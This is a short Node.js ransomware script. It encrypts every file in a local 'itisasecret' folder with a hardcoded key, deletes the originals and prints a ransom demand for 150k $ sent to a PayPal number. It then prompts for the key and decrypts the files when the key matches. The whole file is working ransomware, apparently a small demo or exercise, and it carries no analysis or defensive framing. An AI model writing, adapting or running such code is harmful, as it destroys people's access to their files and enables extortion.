let encryptor = require("file-encryptor");
let readlineSync = require("readline-sync");
let fs = require("fs");

let encryptionKey = "kapoykaayo";
let itisasecret = "./itisasecret/";

let decryptionKey = "";


let filesToEncrypt = fs.readdirSync(itisasecret);
let filesEncrypted = 0;

filesToEncrypt.forEach((file, index) => {
  encryptor.encryptFile(
    `${itisasecret}${file}`,
    `${itisasecret}${file}.encrypt`,
    encryptionKey,
    function (err) {
      if (err) {
        console.error("Error encrypting file:", err);
        return;
      }
      
      fs.unlinkSync(`${itisasecret}${file}`);
      filesEncrypted++;

      if (filesEncrypted === filesToEncrypt.length) {
        console.log(
          `Your files are now encrypted. If you want to retrieve them, send 150k $ to my PayPal account 09346782908 and I will provide you the decryption key. Type "exit" to quit.`
        );
        startDecryption();
      }
    }
  );
});

function startDecryption() {
  while (true) {
    decryptionKey = readlineSync.question("Please enter the decryption key: ");

    if (decryptionKey.toLowerCase() === "exit") {
      console.log("Exiting decryption process.");
      process.exit(1);
    }

    if (decryptionKey === encryptionKey) {
      decryptFiles(decryptionKey);
      break;
    } else {
      console.log(
        'Wrong decryption key. Please try again, or type "exit" to quit.'
      );
    }
  }
}

function decryptFiles(decryptionKey) {
  let filesToDecrypt = fs.readdirSync(itisasecret);
  let filesDecrypted = 0;

  filesToDecrypt.forEach((file) => {
    encryptor.decryptFile(
      `${itisasecret}${file}`,
      `${itisasecret}${file}`.replace(".encrypt", ""),
      decryptionKey,
      function (err) {
        if (err) {
          console.error("Error decrypting file:", err);
          return;
        }

        fs.unlinkSync(`${itisasecret}${file}`);
        filesDecrypted++;

        if (filesDecrypted === filesToDecrypt.length) {
          console.log("You've successfully decrypted your files.");
          process.exit(1);
        }
      }
    );
  });
}
